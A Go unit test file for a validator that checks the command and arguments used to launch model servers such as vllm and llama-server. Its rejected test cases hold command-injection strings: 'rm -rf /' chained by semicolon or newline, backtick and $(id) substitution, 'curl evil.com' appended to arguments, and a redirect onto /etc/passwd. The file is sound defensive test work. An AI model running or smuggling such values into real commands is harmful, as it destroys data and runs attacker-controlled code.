package config

import (
	"path/filepath"
	"strings"
	"testing"
)

func TestValidateExecutionCommand(t *testing.T) {
	root := t.TempDir()
	tests := []struct {
		name      string
		exec      ExecutionConfig
		wantErr   bool
		errSubstr string
	}{
		{
			name: "empty command allowed (template entry)",
			exec: ExecutionConfig{Command: "", Args: []string{"--port", "${PORT}"}},
		},
		{
			name: "bare python3",
			exec: ExecutionConfig{Command: "python3", Args: []string{"-m", "vllm.entrypoints.openai.api_server"}},
		},
		{
			name: "bare vllm with template args",
			exec: ExecutionConfig{Command: "vllm", Args: []string{"serve", "${MODEL_PATH}", "--port", "${PORT}", "--host", "0.0.0.0"}},
		},
		{
			name: "hyphenated llama-server",
			exec: ExecutionConfig{Command: "llama-server", Args: []string{"--model", "${MODEL_PATH}"}},
		},
		{
			name: "absolute native path",
			exec: ExecutionConfig{Command: filepath.Join(root, "usr", "local", "bin", "vllm"), Args: []string{"--port", "${PORT}"}},
		},
		{
			name: "absolute native path with spaces-free dirs",
			exec: ExecutionConfig{Command: filepath.Join(root, "opt", "homebrew", "bin", "python3")},
		},
		{
			name:      "command with semicolon rejected",
			exec:      ExecutionConfig{Command: "python3; rm -rf /"},
			wantErr:   true,
			errSubstr: "shell metacharacter",
		},
		{
			name:      "command with pipe rejected",
			exec:      ExecutionConfig{Command: "python3 | evil"},
			wantErr:   true,
			errSubstr: "shell metacharacter",
		},
		{
			name:      "command with command substitution rejected",
			exec:      ExecutionConfig{Command: "python3`id`"},
			wantErr:   true,
			errSubstr: "shell metacharacter",
		},
		{
			name:      "command with dollar expansion rejected",
			exec:      ExecutionConfig{Command: "python3$(id)"},
			wantErr:   true,
			errSubstr: "shell metacharacter",
		},
		{
			name:      "command with newline rejected",
			exec:      ExecutionConfig{Command: "python3\nrm -rf /"},
			wantErr:   true,
			errSubstr: "shell metacharacter",
		},
		{
			name:      "relative path with slash rejected",
			exec:      ExecutionConfig{Command: "bin/python3"},
			wantErr:   true,
			errSubstr: "absolute path or a simple name",
		},
		{
			name:      "command with space rejected (not bare, not absolute)",
			exec:      ExecutionConfig{Command: "python3 --help"},
			wantErr:   true,
			errSubstr: "absolute path or a simple name",
		},
		{
			name: "args with template tokens allowed",
			exec: ExecutionConfig{Command: "vllm", Args: []string{
				"--model", "${MODEL_PATH}",
				"--port", "${PORT}",
				"--served-model-name", "${MODEL}",
			}},
		},
		{
			name:      "args with injected backtick rejected",
			exec:      ExecutionConfig{Command: "vllm", Args: []string{"--foo", "bar`id`"}},
			wantErr:   true,
			errSubstr: "execution.args[1]",
		},
		{
			name:      "args with semicolon rejected",
			exec:      ExecutionConfig{Command: "vllm", Args: []string{"serve; curl evil.com"}},
			wantErr:   true,
			errSubstr: "execution.args[0]",
		},
		{
			name:      "args with shell redirect rejected",
			exec:      ExecutionConfig{Command: "vllm", Args: []string{"--port", "8080 > /etc/passwd"}},
			wantErr:   true,
			errSubstr: "shell metacharacter",
		},
		{
			// Native absolute paths may contain spaces and parentheses.
			name: "absolute native path with parens and spaces allowed",
			exec: ExecutionConfig{Command: filepath.Join(root, "opt", "My App (x86)", "bin", "python3")},
		},
		{
			name:      "absolute path with newline rejected",
			exec:      ExecutionConfig{Command: filepath.Join(root, "bin", "python3") + "\n; evil"},
			wantErr:   true,
			errSubstr: "control character",
		},
		{
			name:      "unterminated template token rejected via metachar check",
			exec:      ExecutionConfig{Command: "vllm", Args: []string{"${FOO"}},
			wantErr:   true,
			errSubstr: "shell metacharacter",
		},
		{
			name:      "template token followed by injected semicolon rejected",
			exec:      ExecutionConfig{Command: "vllm", Args: []string{"${MODEL_PATH}; curl evil.com"}},
			wantErr:   true,
			errSubstr: "shell metacharacter",
		},
		{
			name: "parens allowed in bare args (legitimate in some flags)",
			exec: ExecutionConfig{Command: "vllm", Args: []string{"--config", "x=(1,2,3)"}},
		},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			err := ValidateExecutionCommand("test-provider", tc.exec)
			if tc.wantErr {
				if err == nil {
					t.Fatalf("want error, got nil")
				}
				if tc.errSubstr != "" && !strings.Contains(err.Error(), tc.errSubstr) {
					t.Fatalf("want error containing %q, got %q", tc.errSubstr, err.Error())
				}
				return
			}
			if err != nil {
				t.Fatalf("want no error, got %v", err)
			}
		})
	}
}
